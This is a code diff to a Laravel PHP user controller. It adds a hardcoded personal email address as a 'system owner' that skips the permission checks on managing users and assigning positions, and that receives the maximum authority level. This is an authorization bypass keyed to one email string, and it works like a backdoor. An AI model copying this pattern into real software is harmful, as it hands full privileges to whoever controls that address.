@@ -25,6 +25,8 @@ use Inertia\Inertia;
 
 class UserController extends Controller
 {
+    private const SYSTEM_OWNER_EMAIL = 'gtvbehieu@gmail.com';
+
     public function __construct(
         protected UserService $userService,
         protected UserApprovalService $userApprovalService,
@@ -291,6 +293,10 @@ class UserController extends Controller
 
     private function ensureManageableUser(User $actor, User $target): void
     {
+        if ($this->isSystemOwner($actor)) {
+            return;
+        }
+
         if ((int) $actor->id === (int) $target->id) {
             return;
         }
@@ -400,11 +406,14 @@ class UserController extends Controller
     private function resolveAssignablePositions(User $actor)
     {
         $actorLevel = $this->resolveActorAuthorityLevel($actor);
+        $query = Position::query()
+            ->where('is_active', true);
 
-        return Position::query()
-            ->where('is_active', true)
-            ->where('authority_level', '<', $actorLevel)
-            ->get(['id', 'name', 'authority_level', 'capabilities']);
+        if (!$this->isSystemOwner($actor)) {
+            $query->where('authority_level', '<', $actorLevel);
+        }
+
+        return $query->get(['id', 'name', 'authority_level', 'capabilities']);
     }
 
     private function assertAssignablePosition(User $actor, int $positionId): void
@@ -428,7 +437,7 @@ class UserController extends Controller
         $actorLevel = $this->resolveActorAuthorityLevel($actor);
         $targetLevel = (int) ($position->authority_level ?? 1);
 
-        if ($targetLevel >= $actorLevel) {
+        if (!$this->isSystemOwner($actor) && $targetLevel >= $actorLevel) {
             throw ValidationException::withMessages([
                 'position_id' => 'Ban chi duoc tao/gan chuc vu co muc quyen han thap hon minh.',
             ]);
@@ -438,6 +447,11 @@ class UserController extends Controller
     private function resolveActorAuthorityLevel(User $actor): int
     {
         $actor->loadMissing('employeeProfile.position');
+
+        if ($this->isSystemOwner($actor)) {
+            return $this->resolveMaxAuthorityLevel();
+        }
+
         $positionLevel = (int) ($actor->employeeProfile?->position?->authority_level ?? 0);
 
         if ($positionLevel > 0) {
@@ -464,6 +478,12 @@ class UserController extends Controller
         }
 
         return 5;
+    }
+
+    private function isSystemOwner(?User $actor): bool
+    {
+        return $actor !== null
+            && strcasecmp((string) $actor->email, self::SYSTEM_OWNER_EMAIL) === 0;
     }
     private function positionRequiresApproval(int $positionId): bool
     {
